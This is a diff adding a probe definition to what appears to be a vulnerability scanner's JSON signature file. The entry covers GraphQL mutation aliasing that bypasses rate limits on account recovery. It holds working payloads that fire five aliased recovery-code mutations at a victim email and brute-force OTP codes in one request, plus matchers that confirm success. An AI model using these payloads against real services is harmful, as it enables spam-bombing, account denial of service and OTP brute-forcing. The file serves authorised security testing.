@@ -819,6 +819,34 @@
           "confidence_boost": 50
         }
       ]
+    },
+    "graphql_mutation_aliasing_account_recovery_dos_2026": {
+      "description": "HackerOne disclosed pattern (high-frequency 2025-2026 H1) — single GraphQL request issues N aliased mutations against a rate-limited recovery endpoint (forgot-password, MFA-resend, phone-verification). Server processes each alias as a distinct call but the per-IP rate limiter sees ONE request; effectively bypasses the limiter by a factor of N. Used for SMS/email spam-bombing, recovery-code exhaustion, account-DoS. Distinct from generic rate-limit absence — this is rate-limit BYPASS via the GraphQL query layer.",
+      "tech_match": ["graphql", "apollo", "hasura", "absinthe", "graphene"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"query\": \"mutation { a1: sendRecoveryCode(email: \\\"victim@x.tld\\\") b1: sendRecoveryCode(email: \\\"victim@x.tld\\\") c1: sendRecoveryCode(email: \\\"victim@x.tld\\\") d1: sendRecoveryCode(email: \\\"victim@x.tld\\\") e1: sendRecoveryCode(email: \\\"victim@x.tld\\\") }\"}",
+          "description": "5 aliased mutations to sendRecoveryCode in one request. Vulnerable server processes all 5; rate-limiter sees ONE request. Confirm out-of-band (count SMS/email delivered to operator-owned victim) OR via aliased-field reflection in JSON response.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "regex", "pattern": "\"a1\".*\"b1\".*\"c1\".*\"d1\".*\"e1\""}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {"manual_chain": true, "content_type": "application/json", "needs_oob_confirmation": true}
+        },
+        {
+          "payload": "{\"query\": \"mutation { a: verifyOtp(code: \\\"000000\\\") b: verifyOtp(code: \\\"111111\\\") c: verifyOtp(code: \\\"222222\\\") d: verifyOtp(code: \\\"333333\\\") e: verifyOtp(code: \\\"444444\\\") }\"}",
+          "description": "Brute-force aliased OTP attempts. Rate-limit bypass + brute-force in one request. Any success-shape (token/verified:true) in any alias = CRITICAL: OTP brute-forceable.",
+          "matchers": [
+            {"type": "regex", "pattern": "\"(?:verifyOtp|verify_otp)\".*(?:success|token|verified|true)"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {"manual_chain": true, "content_type": "application/json"}
+        }
+      ]
     }
   }
 }
